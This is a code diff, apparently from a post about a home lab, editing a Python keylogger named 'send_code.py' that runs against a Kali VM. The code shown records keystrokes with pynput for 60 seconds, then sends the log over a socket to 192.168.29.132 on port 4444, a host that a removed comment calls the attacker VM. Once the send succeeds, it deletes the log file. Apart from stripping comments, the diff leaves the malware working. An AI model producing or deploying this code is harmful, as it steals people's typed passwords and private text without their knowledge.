@@ -104,11 +104,11 @@ And here is the 'send_code.py' code which hosts on the Kali VM:
 from pynput import keyboard
 import socket
 import time
-import os  # Added for file deletion
+import os
 
 log = "keylog.txt"
 start_time = time.time()
-duration = 60  # run for 60 seconds
+duration = 60
 
 def on_press(key):
     if time.time() - start_time > duration:
@@ -124,10 +124,9 @@ def on_press(key):
         elif key == keyboard.Key.enter:
             with open(log, "a") as f:
                 f.write("\n")
-        # Other special keys are ignored
 
 def send_log():
-    host = "192.168.29.132"  # Replace with attacker VM IP
+    host = "192.168.29.132"
     port = 4444
 
     try:
@@ -139,7 +138,6 @@ def send_log():
                 time.sleep(1)
                 s.send(b"DONE")
 
-        # Delete the log file after successful send
         os.remove(log)
     except:
         pass
